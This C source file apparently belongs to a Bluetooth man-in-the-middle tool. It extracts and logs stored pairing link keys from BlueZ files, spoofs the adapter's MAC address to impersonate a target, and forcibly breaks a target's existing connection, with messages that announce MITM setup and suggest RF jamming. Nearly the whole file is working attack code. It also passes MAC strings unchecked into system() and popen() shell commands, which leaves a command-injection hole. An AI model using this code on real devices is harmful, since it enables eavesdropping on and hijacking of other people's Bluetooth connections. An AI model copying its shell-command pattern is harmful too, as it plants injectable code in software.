#include "bt_utils.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

int bt_get_adapter_address(char *adapter_addr, size_t size) {
    int dev_id = hci_get_route(NULL);
    if (dev_id < 0) {
        ERROR_PRINT("No Bluetooth adapter found");
        return -1;
    }
    
    int sock = hci_open_dev(dev_id);
    if (sock < 0) {
        ERROR_PRINT("Failed to open HCI device");
        return -1;
    }
    
    bdaddr_t bdaddr;
    if (hci_read_bd_addr(sock, &bdaddr, 1000) < 0) {
        ERROR_PRINT("Failed to read adapter address");
        close(sock);
        return -1;
    }
    
    ba2str(&bdaddr, adapter_addr);
    close(sock);
    
    DEBUG_PRINT("Adapter address: %s", adapter_addr);
    return 0;
}

int bt_extract_link_key(const char *adapter_mac, const char *device_mac, char *key_out, size_t key_size) {
    char info_path[512];
    snprintf(info_path, sizeof(info_path), "%s/%s/%s/info", BLUETOOTH_INFO_PATH, adapter_mac, device_mac);
    
    FILE *fp = fopen(info_path, "r");
    if (!fp) {
        ERROR_PRINT("Failed to open info file: %s", info_path);
        return -1;
    }
    
    char line[256];
    int in_linkkey_section = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "[LinkKey]")) {
            in_linkkey_section = 1;
            continue;
        }
        
        if (in_linkkey_section && strstr(line, "Key=")) {
            char *key_start = strchr(line, '=');
            if (key_start) {
                key_start++;
                while (*key_start == ' ') key_start++;
                
                size_t len = strlen(key_start);
                if (len > 0 && key_start[len-1] == '\n') {
                    key_start[len-1] = '\0';
                }
                
                strncpy(key_out, key_start, key_size - 1);
                key_out[key_size - 1] = '\0';
                
                fclose(fp);
                INFO_PRINT("Link key extracted: %s", key_out);
                return 0;
            }
        }
        
        if (in_linkkey_section && line[0] == '[') {
            in_linkkey_section = 0;
        }
    }
    
    fclose(fp);
    ERROR_PRINT("Link key not found in info file");
    return -1;
}

int bt_spoof_mac_address(int adapter_id, const char *target_mac) {
    char cmd[256];
    
    snprintf(cmd, sizeof(cmd), "hciconfig hci%d down", adapter_id);
    if (system(cmd) != 0) {
        ERROR_PRINT("Failed to bring adapter down");
        return -1;
    }
    
    snprintf(cmd, sizeof(cmd), "bdaddr -i hci%d %s", adapter_id, target_mac);
    if (system(cmd) != 0) {
        ERROR_PRINT("Failed to spoof MAC address (bdaddr tool may not be installed)");
        return -1;
    }
    
    snprintf(cmd, sizeof(cmd), "hciconfig hci%d up", adapter_id);
    if (system(cmd) != 0) {
        ERROR_PRINT("Failed to bring adapter up");
        return -1;
    }
    
    INFO_PRINT("MAC address spoofed to: %s", target_mac);
    return 0;
}

int bt_create_l2cap_socket(void) {
    int sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sock < 0) {
        ERROR_PRINT("Failed to create L2CAP socket");
        return -1;
    }
    return sock;
}

int bt_connect_l2cap(int sock, const char *dest_addr, uint16_t psm) {
    struct sockaddr_l2 addr = {0};
    addr.l2_family = AF_BLUETOOTH;
    str2ba(dest_addr, &addr.l2_bdaddr);
    addr.l2_psm = htobs(psm);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ERROR_PRINT("Failed to connect to %s on PSM %d", dest_addr, psm);
        return -1;
    }
    
    DEBUG_PRINT("Connected to %s on PSM %d", dest_addr, psm);
    return 0;
}

int bt_bind_l2cap(int sock, const char *src_addr, uint16_t psm) {
    struct sockaddr_l2 addr = {0};
    addr.l2_family = AF_BLUETOOTH;
    
    if (src_addr) {
        str2ba(src_addr, &addr.l2_bdaddr);
    } else {
        bacpy(&addr.l2_bdaddr, BDADDR_ANY);
    }
    
    addr.l2_psm = htobs(psm);
    
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ERROR_PRINT("Failed to bind L2CAP socket");
        return -1;
    }
    
    DEBUG_PRINT("Bound L2CAP socket on PSM %d", psm);
    return 0;
}

int bt_listen_l2cap(int sock, int backlog) {
    if (listen(sock, backlog) < 0) {
        ERROR_PRINT("Failed to listen on L2CAP socket");
        return -1;
    }
    
    DEBUG_PRINT("Listening on L2CAP socket");
    return 0;
}

int bt_accept_l2cap(int server_sock, char *client_addr, size_t addr_size) {
    struct sockaddr_l2 addr = {0};
    socklen_t opt = sizeof(addr);
    
    int client_sock = accept(server_sock, (struct sockaddr *)&addr, &opt);
    if (client_sock < 0) {
        ERROR_PRINT("Failed to accept L2CAP connection");
        return -1;
    }
    
    if (client_addr) {
        ba2str(&addr.l2_bdaddr, client_addr);
        DEBUG_PRINT("Accepted connection from %s", client_addr);
    }
    
    return client_sock;
}

int bt_scan_devices(bt_device_t *devices, int max_devices, int scan_duration) {
    INFO_PRINT("Listing paired and connected Bluetooth devices...");
    
    // Use bluetoothctl to list devices (both paired and connected)
    FILE *fp = popen("bluetoothctl devices 2>&1", "r");
    if (!fp) {
        ERROR_PRINT("Failed to run bluetoothctl");
        return -1;
    }
    
    char line[512];
    int count = 0;
    
    // Parse output: "Device AA:BB:CC:DD:EE:FF Device Name"
    while (fgets(line, sizeof(line), fp) && count < max_devices) {
        if (strncmp(line, "Device ", 7) != 0) {
            continue;
        }
        
        char *mac_start = line + 7;
        char *space = strchr(mac_start, ' ');
        if (!space) {
            continue;
        }
        
        // Extract MAC address
        int mac_len = space - mac_start;
        if (mac_len >= sizeof(devices[count].addr)) {
            continue;
        }
        
        strncpy(devices[count].addr, mac_start, mac_len);
        devices[count].addr[mac_len] = '\0';
        
        // Extract device name
        char *name_start = space + 1;
        char *newline = strchr(name_start, '\n');
        if (newline) {
            *newline = '\0';
        }
        strncpy(devices[count].name, name_start, sizeof(devices[count].name) - 1);
        devices[count].name[sizeof(devices[count].name) - 1] = '\0';
        
        // Check if connected
        devices[count].connected = bt_check_connection_status(devices[count].addr);
        devices[count].rssi = 0;
        
        count++;
    }
    
    pclose(fp);
    
    if (count == 0) {
        INFO_PRINT("No paired devices found");
        INFO_PRINT("To pair devices, use: bluetoothctl");
    } else {
        INFO_PRINT("Found %d paired/connected device(s)", count);
    }
    
    return count;
}


int bt_check_connection_status(const char *device_mac) {
    char cmd[256];
    FILE *fp;
    char output[512];
    int connected = 0;
    
    snprintf(cmd, sizeof(cmd), 
        "echo -e 'info %s\\nquit' | bluetoothctl 2>&1 | grep -i 'connected: yes'",
        device_mac);
    
    fp = popen(cmd, "r");
    if (fp) {
        if (fgets(output, sizeof(output), fp)) {
            connected = 1;
        }
        pclose(fp);
    }
    
    return connected;
}

int bt_disconnect_device(const char *device_mac) {
    char cmd[256];
    FILE *fp;
    char output[256];
    int disconnected = 0;
    
    INFO_PRINT("Disconnecting device: %s", device_mac);
    
    snprintf(cmd, sizeof(cmd), 
        "echo -e 'disconnect %s\\nquit' | bluetoothctl 2>&1",
        device_mac);
    
    fp = popen(cmd, "r");
    if (fp) {
        while (fgets(output, sizeof(output), fp)) {
            if (strstr(output, "Successful disconnected") || 
                strstr(output, "not connected")) {
                disconnected = 1;
                INFO_PRINT("Device disconnected successfully");
            }
        }
        pclose(fp);
    }
    
    sleep(2);
    return disconnected ? 0 : -1;
}

int bt_force_disconnect(const char *source_mac, const char *target_mac) {
    INFO_PRINT("=== FORCE DISCONNECT MODE ===");
    INFO_PRINT("Target: %s", target_mac);
    INFO_PRINT("Will break existing connection and establish MITM");
    
    // Check if target is connected
    int is_connected = bt_check_connection_status(target_mac);
    
    if (!is_connected) {
        INFO_PRINT("Target device is not currently connected");
        return 0;
    }
    
    INFO_PRINT("Target device is currently connected to another device");
    INFO_PRINT("Attempting to break the connection...");
    
    // Method 1: Polite disconnect via bluetoothctl
    INFO_PRINT("Method 1: Attempting polite disconnect...");
    if (bt_disconnect_device(target_mac) == 0) {
        INFO_PRINT("Polite disconnect successful");
        sleep(2);
        return 0;
    }
    
    // Method 2: Remove device pairing (forces disconnect)
    INFO_PRINT("Method 2: Removing device pairing to force disconnect...");
    char cmd[256];
    snprintf(cmd, sizeof(cmd), 
        "echo -e 'remove %s\\nquit' | bluetoothctl > /dev/null 2>&1",
        target_mac);
    system(cmd);
    sleep(3);
    
    // Verify disconnection
    is_connected = bt_check_connection_status(target_mac);
    if (!is_connected) {
        INFO_PRINT("Forced disconnect successful via pairing removal");
        return 0;
    }
    
    // Method 3: HCI-level disconnect (requires hcitool)
    INFO_PRINT("Method 3: Attempting HCI-level disconnect...");
    snprintf(cmd, sizeof(cmd), 
        "hcitool dc %s 2>&1",
        target_mac);
    FILE *fp = popen(cmd, "r");
    if (fp) {
        char output[256];
        while (fgets(output, sizeof(output), fp)) {
            DEBUG_PRINT("hcitool: %s", output);
        }
        pclose(fp);
    }
    sleep(2);
    
    // Final verification
    is_connected = bt_check_connection_status(target_mac);
    if (!is_connected) {
        INFO_PRINT("HCI-level disconnect successful");
        return 0;
    }
    
    // Method 4: RF jamming notice (requires external hardware)
    ERROR_PRINT("Software disconnect methods failed");
    INFO_PRINT("========================================");
    INFO_PRINT("ADVANCED OPTION: RF Jamming");
    INFO_PRINT("========================================");
    INFO_PRINT("To break a stubborn Bluetooth connection, you may need:");
    INFO_PRINT("1. RF Jammer (2.4GHz) - Hardware device to disrupt connection");
    INFO_PRINT("2. Ubertooth One - For active de-authentication attacks");
    INFO_PRINT("3. Physical separation - Move devices far apart (>100m)");
    INFO_PRINT("4. Power cycle - Turn off source device temporarily");
    INFO_PRINT("");
    INFO_PRINT("For now, proceeding with MITM setup...");
    INFO_PRINT("The interceptor will wait for natural disconnection");
    INFO_PRINT("========================================");
    
    return -1;
}

int bt_auto_pair_device(const char *device_mac) {
    char cmd[512];
    FILE *fp;
    char output[256];
    int paired = 0;
    int trusted = 0;
    int connected = 0;
    
    INFO_PRINT("Attempting to pair with device: %s", device_mac);
    
    // Check if already paired
    snprintf(cmd, sizeof(cmd), 
        "echo -e 'info %s\\nquit' | bluetoothctl 2>&1 | grep -q 'Paired: yes'", 
        device_mac);
    if (system(cmd) == 0) {
        INFO_PRINT("Device already paired");
        paired = 1;
    }
    
    // Power on the adapter
    INFO_PRINT("Powering on Bluetooth adapter...");
    system("echo -e 'power on\\nquit' | bluetoothctl > /dev/null 2>&1");
    sleep(2);
    
    // Make adapter discoverable
    system("echo -e 'discoverable on\\nquit' | bluetoothctl > /dev/null 2>&1");
    sleep(1);
    
    // Scan for the device
    INFO_PRINT("Scanning for device...");
    snprintf(cmd, sizeof(cmd), 
        "timeout 10 bash -c \"echo -e 'scan on\\n' | bluetoothctl & sleep 8; killall bluetoothctl\" 2>&1");
    system(cmd);
    
    // Remove device if already paired (for clean pairing)
    if (paired) {
        INFO_PRINT("Removing existing pairing...");
        snprintf(cmd, sizeof(cmd), 
            "echo -e 'remove %s\\nquit' | bluetoothctl > /dev/null 2>&1", 
            device_mac);
        system(cmd);
        sleep(2);
        paired = 0;
    }
    
    // Pair with device
    if (!paired) {
        INFO_PRINT("Pairing with device...");
        snprintf(cmd, sizeof(cmd), 
            "timeout 30 bash -c \"echo -e 'pair %s\\nquit' | bluetoothctl 2>&1\"", 
            device_mac);
        
        fp = popen(cmd, "r");
        if (fp) {
            while (fgets(output, sizeof(output), fp)) {
                if (strstr(output, "Pairing successful") || 
                    strstr(output, "paired successfully")) {
                    paired = 1;
                    INFO_PRINT("Pairing successful");
                }
                if (strstr(output, "Failed to pair") || 
                    strstr(output, "org.bluez.Error")) {
                    ERROR_PRINT("Pairing failed: %s", output);
                }
            }
            pclose(fp);
        }
        
        if (!paired) {
            ERROR_PRINT("Pairing failed");
            return -1;
        }
        sleep(2);
    }
    
    // Trust the device
    INFO_PRINT("Trusting device...");
    snprintf(cmd, sizeof(cmd), 
        "echo -e 'trust %s\\nquit' | bluetoothctl 2>&1", 
        device_mac);
    
    fp = popen(cmd, "r");
    if (fp) {
        while (fgets(output, sizeof(output), fp)) {
            if (strstr(output, "trust succeeded") || 
                strstr(output, "already trusted")) {
                trusted = 1;
            }
        }
        pclose(fp);
    }
    
    if (!trusted) {
        ERROR_PRINT("Failed to trust device");
        return -1;
    }
    
    // Connect to device
    INFO_PRINT("Connecting to device...");
    snprintf(cmd, sizeof(cmd), 
        "timeout 15 bash -c \"echo -e 'connect %s\\nquit' | bluetoothctl 2>&1\"", 
        device_mac);
    
    fp = popen(cmd, "r");
    if (fp) {
        while (fgets(output, sizeof(output), fp)) {
            if (strstr(output, "Connection successful") || 
                strstr(output, "connected successfully")) {
                connected = 1;
                INFO_PRINT("Connection successful");
            }
            if (strstr(output, "Failed to connect")) {
                // This is OK - we just need the pairing to work
                DEBUG_PRINT("Connection attempt: %s", output);
            }
        }
        pclose(fp);
    }
    
    // Wait for BlueZ to write pairing info
    sleep(3);
    
    INFO_PRINT("Auto-pairing completed");
    return 0;
}
